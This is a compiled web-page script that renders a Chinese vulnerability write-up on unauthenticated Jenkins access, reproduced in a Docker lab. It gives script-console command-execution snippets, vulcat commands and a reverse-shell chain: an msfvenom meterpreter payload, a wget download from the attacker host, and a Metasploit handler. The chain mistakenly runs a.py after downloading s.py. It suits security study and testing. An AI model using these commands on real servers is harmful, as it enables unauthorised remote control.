(window.webpackJsonp=window.webpackJsonp||[]).push([[26],{341:function(t,s,a){"use strict";a.r(s);var n=a(7),e=Object(n.a)({},(function(){var t=this,s=t._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[s("h1",{attrs:{id:"🧡-jenkins未授权访问"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#🧡-jenkins未授权访问"}},[t._v("#")]),t._v(" 🧡 Jenkins未授权访问")]),t._v(" "),s("h2",{attrs:{id:"_1-漏洞信息"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_1-漏洞信息"}},[t._v("#")]),t._v(" 1）漏洞信息")]),t._v(" "),s("table",[s("thead",[s("tr",[s("th",[t._v("漏洞名称")]),t._v(" "),s("th",[t._v("受影响组件")]),t._v(" "),s("th",[t._v("漏洞类型")]),t._v(" "),s("th",[t._v("漏洞编号")])])]),t._v(" "),s("tbody",[s("tr",[s("td",[t._v("Jenkins未授权访问")]),t._v(" "),s("td",[s("a",{attrs:{href:"https://www.jenkins.io/zh/",target:"_blank",rel:"noopener noreferrer"}},[t._v("Jenkins"),s("OutboundLink")],1)]),t._v(" "),s("td",[t._v("未授权访问")]),t._v(" "),s("td",[t._v("暂无")])])])]),t._v(" "),s("table",[s("thead",[s("tr",[s("th",[t._v("漏洞简介")])])]),t._v(" "),s("tbody",[s("tr",[s("td",[s("p",[t._v("默认情况下 Jenkins面板中用户可以选择执行脚本界面 来操作一些系统层命令")]),t._v("攻击者可通过未授权访问漏洞，或者暴力破解用户密码等方式进入后台管理服务，通过脚本执行界面获取服务器权限")])])])]),t._v(" "),s("table",[s("thead",[s("tr",[s("th",[t._v("参考链接")])])]),t._v(" "),s("tbody",[s("tr",[s("td",[s("ol",[s("li",[s("a",{attrs:{href:"https://blog.csdn.net/weixin_40412037/article/details/120369441",target:"_blank",rel:"noopener noreferrer"}},[t._v("https://blog.csdn.net/weixin_40412037/article/details/120369441"),s("OutboundLink")],1)]),s("li",[s("a",{attrs:{href:"https://blog.csdn.net/weixin_39664643/article/details/118154046",target:"_blank",rel:"noopener noreferrer"}},[t._v("https://blog.csdn.net/weixin_39664643/article/details/118154046"),s("OutboundLink")],1)])])])])])]),t._v(" "),s("table",[s("thead",[s("tr",[s("th",[t._v("补丁及修复方案")])])]),t._v(" "),s("tbody",[s("tr",[s("td",[s("ol",[s("li",[t._v("配置Jenkins登录验证")])])])])])]),t._v(" "),s("table",[s("thead",[s("tr",[s("th",[t._v("网络空间测绘")])])]),t._v(" "),s("tbody",[s("tr",[s("td",[t._v("FOFA："),s("code")])]),t._v(" "),s("tr",[s("td",[t._v("FOFA："),s("code")])]),t._v(" "),s("tr",[s("td",[t._v("FOFA："),s("code")])])])]),t._v(" "),s("h2",{attrs:{id:"_2-漏洞环境"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_2-漏洞环境"}},[t._v("#")]),t._v(" 2）漏洞环境")]),t._v(" "),s("p",[t._v("此处使用"),s("a",{attrs:{href:"https://hub.docker.com/_/jenkins",target:"_blank",rel:"noopener noreferrer"}},[t._v("官方镜像"),s("OutboundLink")],1),t._v("搭建漏洞环境")]),t._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[t._v("docker pull jenkins:1.625.1\ndocker run -itd -p 8080:8080 -p 50000:50000 jenkins:1.625.1\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br"),s("span",{staticClass:"line-number"},[t._v("2")]),s("br")])]),s("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/vuepress/static/imgs/docs/vuln-db/jenkins/unauth/01.png",alt:""}}),t._v(" "),s("p",[t._v("启动容器后，访问8080端口即可看到 jenkins 页面\n"),s("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/vuepress/static/imgs/docs/vuln-db/jenkins/unauth/02.png",alt:""}})]),t._v(" "),s("h2",{attrs:{id:"_3-漏洞复现-手工"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_3-漏洞复现-手工"}},[t._v("#")]),t._v(" 3）漏洞复现-手工")]),t._v(" "),s("p",[t._v("点击 “系统管理” --\x3e “脚本命令行”\n"),s("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/vuepress/static/imgs/docs/vuln-db/jenkins/unauth/03.png",alt:""}})]),t._v(" "),s("p",[t._v("输入以下脚本，然后点击 “运行”，即可在下方看到执行结果。")]),t._v(" "),s("div",{staticClass:"language-groovy line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-groovy"}},[s("code",[t._v("println "),s("span",{pre:!0,attrs:{class:"token interpolation-string"}},[s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"whoami"')])]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("execute")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("text\n\nprintln "),s("span",{pre:!0,attrs:{class:"token interpolation-string"}},[s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"cat /etc/hosts"')])]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("execute")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("text\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br"),s("span",{staticClass:"line-number"},[t._v("2")]),s("br"),s("span",{staticClass:"line-number"},[t._v("3")]),s("br")])]),s("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/vuepress/static/imgs/docs/vuln-db/jenkins/unauth/04.png",alt:""}}),t._v(" "),s("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/vuepress/static/imgs/docs/vuln-db/jenkins/unauth/05.png",alt:""}}),t._v(" "),s("p",[t._v("除了上面的 Groovy 语法以外，还可以通过 java 的方式来实现命令执行：")]),t._v(" "),s("p",[t._v("这种方法与 ElasticSearch 的 "),s("a",{attrs:{href:"https://vulhub.org/#/environments/elasticsearch/CVE-2015-1427/",target:"_blank",rel:"noopener noreferrer"}},[t._v("CVE-2015-1427"),s("OutboundLink")],1),t._v(" 有点类似。")]),t._v(" "),s("div",{staticClass:"language-groovy line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-groovy"}},[s("code",[t._v("java"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("lang"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("Math"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("class")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("forName")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token interpolation-string"}},[s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"java.lang.Runtime"')])]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("getRuntime")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("exec")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token interpolation-string"}},[s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"whoami"')])]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("getText")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br")])]),s("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/vuepress/static/imgs/docs/vuln-db/jenkins/unauth/10.png",alt:""}}),t._v(" "),s("h2",{attrs:{id:"_4-漏洞复现-vulcat"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_4-漏洞复现-vulcat"}},[t._v("#")]),t._v(" 4）漏洞复现-vulcat")]),t._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[t._v("python3 vulcat.py "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-u")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("URL"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-v")]),t._v(" jenkins-unauth\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br")])]),s("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/vuepress/static/imgs/docs/vuln-db/jenkins/unauth/06.png",alt:""}}),t._v(" "),s("p",[t._v("支持 "),s("code",[t._v("--shell")]),t._v(" 选项")]),t._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[t._v("python3 vulcat.py "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-u")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("URL"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-v")]),t._v(" jenkins-unauth "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("--shell")]),t._v("\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br")])]),s("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/vuepress/static/imgs/docs/vuln-db/jenkins/unauth/07.png",alt:""}}),t._v(" "),s("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/vuepress/static/imgs/docs/vuln-db/jenkins/unauth/08.png",alt:""}}),t._v(" "),s("p",[t._v("你可以通过"),s("code",[t._v("vcsearch")]),t._v("语法，使用正则表达式精确匹配回显的位置")]),t._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# 搜索 <h2>Result</h2> 及其后面的 300 个字符")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("id")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" vcsearch "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("h"),s("span",{pre:!0,attrs:{class:"token operator"}},[s("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[t._v("2")]),t._v(">")]),t._v("Result"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("/h"),s("span",{pre:!0,attrs:{class:"token operator"}},[s("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[t._v("2")]),t._v(">")]),t._v("."),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("0,300")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br"),s("span",{staticClass:"line-number"},[t._v("2")]),s("br")])]),s("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/vuepress/static/imgs/docs/vuln-db/jenkins/unauth/09.png",alt:""}}),t._v(" "),s("h2",{attrs:{id:"_5-漏洞复现-getshell"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_5-漏洞复现-getshell"}},[t._v("#")]),t._v(" 5）漏洞复现-GetShell")]),t._v(" "),s("p",[t._v("使用"),s("code",[t._v("msfvenom")]),t._v("生成载荷")]),t._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[t._v("msfvenom "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-p")]),t._v(" python/meterpreter/reverse_tcp "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("LHOST")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("你的IP"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("LPORT")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("你的端口"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-f")]),t._v(" raw "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" s.py\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br")])]),s("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/vuepress/static/imgs/docs/vuln-db/jenkins/unauth/11.png",alt:""}}),t._v(" "),s("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/vuepress/static/imgs/docs/vuln-db/jenkins/unauth/12.png",alt:""}}),t._v(" "),s("p",[t._v("接着，在"),s("code",[t._v("s.py")]),t._v("所在目录下，使用 python 在攻击机本地启动一个 HTTP 服务")]),t._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[t._v("python3 "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-m")]),t._v(" http.server "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("--bind")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("192.168")]),t._v(".80.1 "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("80")]),t._v("\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br")])]),s("p",[t._v("然后在 jenkins 脚本命令行中，通过 wget 下载 s.py")]),t._v(" "),s("div",{staticClass:"language-groovy line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-groovy"}},[s("code",[t._v("java"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("lang"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("Math"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("class")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("forName")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token interpolation-string"}},[s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"java.lang.Runtime"')])]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("getRuntime")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("exec")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token interpolation-string"}},[s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"wget http://192.168.80.1/s.py -O /tmp/s.py"')])]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("getText")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br")])]),s("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/vuepress/static/imgs/docs/vuln-db/jenkins/unauth/13.png",alt:""}}),t._v(" "),s("p",[t._v("在攻击机上运行 msfconsole，并设置载荷：")]),t._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[t._v("use exploit/multi/handler\n"),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("set")]),t._v(" lhost "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("你的IP"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("set")]),t._v(" lport "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("你的端口"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("set")]),t._v(" payload python/meterpreter/reverse_tcp\n\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# 运行")]),t._v("\nrun\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br"),s("span",{staticClass:"line-number"},[t._v("2")]),s("br"),s("span",{staticClass:"line-number"},[t._v("3")]),s("br"),s("span",{staticClass:"line-number"},[t._v("4")]),s("br"),s("span",{staticClass:"line-number"},[t._v("5")]),s("br"),s("span",{staticClass:"line-number"},[t._v("6")]),s("br"),s("span",{staticClass:"line-number"},[t._v("7")]),s("br")])]),s("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/vuepress/static/imgs/docs/vuln-db/jenkins/unauth/14.png",alt:""}}),t._v(" "),s("p",[t._v("在 jenkins 脚本命令行通过 python 运行 /tmp/s.py")]),t._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[t._v("java.lang.Math.class.forName"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"java.lang.Runtime"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(".getRuntime"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(".exec"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"python /tmp/a.py"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(".getText"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br")])]),s("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/vuepress/static/imgs/docs/vuln-db/jenkins/unauth/15.png",alt:""}}),t._v(" "),s("p",[t._v("回到 msfconsole 窗口，成功连接")]),t._v(" "),s("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/vuepress/static/imgs/docs/vuln-db/jenkins/unauth/16.png",alt:""}}),t._v(" "),s("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/vuepress/static/imgs/docs/vuln-db/jenkins/unauth/17.png",alt:""}})])}),[],!1,null,null,null);s.default=e.exports}}]);